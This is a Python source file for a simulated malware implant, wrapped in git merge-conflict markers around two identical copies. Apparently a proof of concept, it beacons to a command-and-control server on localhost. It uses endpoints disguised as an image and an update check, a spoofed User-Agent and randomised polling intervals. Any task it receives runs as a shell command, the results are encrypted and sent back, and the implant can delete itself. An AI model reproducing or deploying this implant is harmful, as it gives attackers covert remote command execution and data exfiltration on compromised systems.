<<<<<<< HEAD
#implant.py
# Simulates an implant dropped onto the compromised target.
# Periodically polls C2 server for tasks with a disguised endpoint:
# decrypts task and executes, or handles control commands like destroy, status, contingency,
# encrypts result, sends it back to the server with another disguised endpoint.
# IT ASSUMES A LINUX ENVIRONMENT WITH STANDARD AND AVAILABLE COMMANDS

import requests
import time
import random
import subprocess
import os  # for file operations
from crypto_utils import encrypt_message, decrypt_message

# Unique identifier for implant instance.
IMPLANT_ID = "implant_001"
# URL of C2 server (running locally for proof of concept).
C2_SERVER = "http://localhost:5000"
# Polling interval ranges (in seconds) for someone random but frequent polls
POLL_INTERVAL = [10, 20]
#longer interval to use in contingency mode if/when C2 is unreachable for more discreteness 
CONTINGENCY_INTERVAL = [60, 120]

def run_task(task):
    """
    Executes given task based on type.
    Performs special actions for control commands: destroy, status, contingency
    Other commands executed as shell commands
    """
    if task == "destroy":
        print("Destroying...")
        try:
            #try self deletion of implant 
            os.remove(__file__)
        except Exception as err:
            print(f"Self deletion failed: {err}")
        return "Implant destroyed."
    elif task == "status":
        #collect system status information
        from datetime import datetime
        now = datetime.now().isoformat()
        user = subprocess.getoutput("whoami")
        uptime = subprocess.getoutput("uptime")
        disk = subprocess.getoutput("df -h")
        return f"[STATUS] \n Time: {now}\n User: {user}\n Uptime: {uptime}\n Disk: {disk}\n"
    elif task == "contingency":
        print("Entering contingency mode")
        return "Contingency triggered"
    else:
        # execute other tasks as a shell command.
        return subprocess.getoutput(task)

def beacon():
    """
    main function to poll the C2 server for tasks.
    Sends a GET request to disguised tasking endpoint and processes response.
    After executing task, sends back the result to the exfil endpoint.
    """
    try:
        # poll disguised endpoint (/images/logo.png here) with implant ID
        response = requests.get(f"{C2_SERVER}/images/logo.png", params={"id": IMPLANT_ID},
                                headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code == 200:
            # Decrypt the received task.
            task = decrypt_message(response.text)
            print(f"[{IMPLANT_ID}] Received task: {task}")
            # Execute the task and capture the result.
            result = run_task(task)
            # Encrypt the result for secure exfiltration.
            encrypted_result = encrypt_message(result)
            # Send the encrypted result to the disguised exfiltration endpoint (/updates/check).
            requests.post(f"{C2_SERVER}/updates/check", json={"id": IMPLANT_ID, "data": encrypted_result},
                          headers={"User-Agent": "Mozilla/5.0"}) 
            # If "contingency" task, sleep longer before next poll
            if task == "contingency":
                time.sleep(random.randint(*CONTINGENCY_INTERVAL))
                return
        else:
            print("No task received")
    except Exception as e:
        print(f"Error: {e}")
        print("C2 unreachable. Entering contingency mode.")
        time.sleep(random.randint(*CONTINGENCY_INTERVAL)) #randomize time within interval to be less obvious
        return
    time.sleep(random.randint(*POLL_INTERVAL))

# Main loop - continuously poll for tasks
while True:
    beacon()

=======
#implant.py
# Simulates an implant dropped onto the compromised target.
# Periodically polls C2 server for tasks with a disguised endpoint:
# decrypts task and executes, or handles control commands like destroy, status, contingency,
# encrypts result, sends it back to the server with another disguised endpoint.
# IT ASSUMES A LINUX ENVIRONMENT WITH STANDARD AND AVAILABLE COMMANDS

import requests
import time
import random
import subprocess
import os  # for file operations
from crypto_utils import encrypt_message, decrypt_message

# Unique identifier for implant instance.
IMPLANT_ID = "implant_001"
# URL of C2 server (running locally for proof of concept).
C2_SERVER = "http://localhost:5000"
# Polling interval ranges (in seconds) for someone random but frequent polls
POLL_INTERVAL = [10, 20]
#longer interval to use in contingency mode if/when C2 is unreachable for more discreteness 
CONTINGENCY_INTERVAL = [60, 120]

def run_task(task):
    """
    Executes given task based on type.
    Performs special actions for control commands: destroy, status, contingency
    Other commands executed as shell commands
    """
    if task == "destroy":
        print("Destroying...")
        try:
            #try self deletion of implant 
            os.remove(__file__)
        except Exception as err:
            print(f"Self deletion failed: {err}")
        return "Implant destroyed."
    elif task == "status":
        #collect system status information
        from datetime import datetime
        now = datetime.now().isoformat()
        user = subprocess.getoutput("whoami")
        uptime = subprocess.getoutput("uptime")
        disk = subprocess.getoutput("df -h")
        return f"[STATUS] \n Time: {now}\n User: {user}\n Uptime: {uptime}\n Disk: {disk}\n"
    elif task == "contingency":
        print("Entering contingency mode")
        return "Contingency triggered"
    else:
        # execute other tasks as a shell command.
        return subprocess.getoutput(task)

def beacon():
    """
    main function to poll the C2 server for tasks.
    Sends a GET request to disguised tasking endpoint and processes response.
    After executing task, sends back the result to the exfil endpoint.
    """
    try:
        # poll disguised endpoint (/images/logo.png here) with implant ID
        response = requests.get(f"{C2_SERVER}/images/logo.png", params={"id": IMPLANT_ID},
                                headers={"User-Agent": "Mozilla/5.0"})
        if response.status_code == 200:
            # Decrypt the received task.
            task = decrypt_message(response.text)
            print(f"[{IMPLANT_ID}] Received task: {task}")
            # Execute the task and capture the result.
            result = run_task(task)
            # Encrypt the result for secure exfiltration.
            encrypted_result = encrypt_message(result)
            # Send the encrypted result to the disguised exfiltration endpoint (/updates/check).
            requests.post(f"{C2_SERVER}/updates/check", json={"id": IMPLANT_ID, "data": encrypted_result},
                          headers={"User-Agent": "Mozilla/5.0"}) 
            # If "contingency" task, sleep longer before next poll
            if task == "contingency":
                time.sleep(random.randint(*CONTINGENCY_INTERVAL))
                return
        else:
            print("No task received")
    except Exception as e:
        print(f"Error: {e}")
        print("C2 unreachable. Entering contingency mode.")
        time.sleep(random.randint(*CONTINGENCY_INTERVAL)) #randomize time within interval to be less obvious
        return
    time.sleep(random.randint(*POLL_INTERVAL))

# Main loop - continuously poll for tasks
while True:
    beacon()

>>>>>>> 1cdb7db12f4a3f70cf3ad0ae6c32187fc3938f1b
